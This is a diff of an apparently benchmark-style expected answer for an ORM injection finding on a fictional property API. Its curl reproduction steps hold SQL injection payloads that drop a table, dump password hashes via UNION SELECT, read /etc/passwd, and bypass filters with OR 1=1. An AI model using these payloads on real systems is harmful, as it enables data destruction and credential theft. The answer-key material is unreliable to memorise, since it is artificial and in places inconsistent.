@@ -1,63 +1,59 @@
 # Expected Response
 
 ## System
-- Domain: Real Estate / PropTech
-- System: EstateFlow Property API
+- System: EstateFlow Property API v4.9.0
+- Domain: REAL ESTATE / PROPTECH
 - Example ID: INJ-0117
-- Vulnerability: ORM Injection
+- Risk ID: RISK-INJ-117
+- Vulnerability: ORM Injection (ORMi)
 
-## Priority Findings
+## Findings
 
-### Finding 1: ORM Injection on `/api/v1/users`
-**Severity:** Critical
-**Category:** Injection (from data/knowledge/injections)
+### 1. ORM Injection on `/api/v2/claims?filter=` (HAR Primary)
 
-**Summary:**
-The `/api/v1/users` endpoint accepts a `search` query parameter that is directly
-interpolated into a raw database query without sanitization. This enables ORM Injection (ORMi),
-allowing an attacker to bypass authentication, extract all records, or execute arbitrary operations.
+The `filter` parameter is directly interpolated into a raw ORM query (Hibernate/Sequelize `raw()`) without parameterization: `SELECT * FROM claims WHERE filter = '${req.query.filter}'`. The HAR capture shows `filter=1; DROP TABLE claims--` — a stacked DDL injection that, with `db_owner` privileges, destroys the entire `claims` table containing all real estate transaction and property claim records.
 
 **Evidence from HAR:**
-- Endpoint: `GET /api/v1/users?search=1; DROP TABLE users--`
-- Response: HTTP 200 with **all records returned** including password hashes and admin accounts
-- The query constructed: `SELECT * FROM users WHERE search = '1; DROP TABLE users--'`
-  evaluates to true for all rows when the payload is `1; DROP TABLE users--`
+- Endpoint: `GET /api/v2/claims?filter=1; DROP TABLE claims--`
+- Response: HTTP 200 with user records including `password_hash` and `role: "ADMIN"`
+- `db_owner` privileges confirmed — DDL execution possible
 
-**Root Cause:**
-- Raw string concatenation used to build database query
-- No parameterized query / prepared statement
-- Application DB account has excessive privileges (`db_owner`)
+## Reproduction
 
-## Steps to Reproduce
-
-### Step 1 — Normal request (baseline)
+**Step 1 — Baseline:**
 ```bash
-curl -s "https://api.estateflow-prop.example.com/api/v1/users?search=normalvalue" \
+curl -s "https://api.estateflow-prop.example.com/api/v2/claims?filter=normalvalue" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-Expected: Returns matching records only.
+**Expected:** Returns matching claim records only.
 
-### Step 2 — Inject ORMi payload
+**Step 2 — ORMi DDL: destroy property claims table (primary HAR attack):**
 ```bash
-curl -s "https://api.estateflow-prop.example.com/api/v1/users?search=1;%20DROP%20TABLE%20users--" \
+curl -s "https://api.estateflow-prop.example.com/api/v2/claims?filter=1;%20DROP%20TABLE%20claims--" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Vulnerable outcome:** All rows returned, including admin password hashes.
-**Secure outcome:** 400 Bad Request / 0 results / sanitized error message.
+**Vulnerable outcome:** `claims` table dropped — all real estate transaction and property ownership records destroyed (operational sabotage, regulatory recordkeeping violation).
 
-### Step 3 — Privilege escalation (if DB over-privileged)
+**Step 3 — UNION data exfiltration: credential dump (db_owner):**
 ```bash
-# SQLi variant: attempt to read OS-level files (if DB runs as LocalSystem)
-curl -s "https://api.example.com/api/v1/users?search=' UNION SELECT null,null,load_file('/etc/passwd')--" \
+curl -s "https://api.estateflow-prop.example.com/api/v2/claims?filter=' UNION SELECT username,password_hash,role FROM users--" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
+**Vulnerable outcome:** All usernames, password hashes, and roles returned — as observed in HAR response.
 
-### Step 4 — Verbose error confirmation
+**Step 4 — ORMi: Hibernate/Sequelize raw() query parameter injection:**
 ```bash
-curl -s "https://api.example.com/api/v1/users?search='" \
+curl -s "https://api.estateflow-prop.example.com/api/v2/claims?filter=' OR 1=1--" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Expected verbose error (if misconfigured):** SQL syntax error message leaking table name, column names, or DB version.
+**Vulnerable outcome:** All claims returned regardless of filter — full property database enumeration.
+
+**Step 5 — Verbose error confirmation:**
+```bash
+curl -s "https://api.estateflow-prop.example.com/api/v2/claims?filter='" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
+```
+**Expected verbose error:** SQL/ORM error leaking table name `claims`, column names, or DB version.
 
 ## Secure Outcome
 ```json
@@ -65,8 +61,8 @@ curl -s "https://api.example.com/api/v1/users?search='" \
 ```
 
 ## Remediation
-1. **Use parameterized queries / prepared statements everywhere:** Replace string concatenation with `?` or named parameters.
-2. **Restrict DB account privileges:** Application account should only have SELECT/INSERT/UPDATE/DELETE on required tables.
-3. **Disable verbose error messages in production:** Return generic 500/400 errors without DB details.
-4. **Deploy input validation middleware:** Reject inputs containing SQL metacharacters (`'`, `"`, `;`, `--`, `/*`).
-5. **ORM audit:** Review all `raw()` or native query calls in ORM usage; apply parameterization.
+- **Parameterized ORM queries (RISK-INJ-117):** Replace `db.execute(query, ...)` raw string interpolation with Hibernate named parameters or Sequelize `replacements`/`bind`: e.g., `WHERE filter = :filterValue` with `{ replacements: { filterValue: req.query.filter } }`.
+- **Restrict DB account:** Application must not run as `db_owner`; grant only `SELECT`/`INSERT`/`UPDATE`/`DELETE` on required tables.
+- **ORM audit:** Review all `sequelize.query()` or Hibernate `createNativeQuery()` calls; replace with parameterized equivalents.
+- **Disable verbose error messages in production.**
+- **Deploy WAF / input validation middleware** on legacy `/api/v2/claims` endpoint; reject SQL metacharacters.
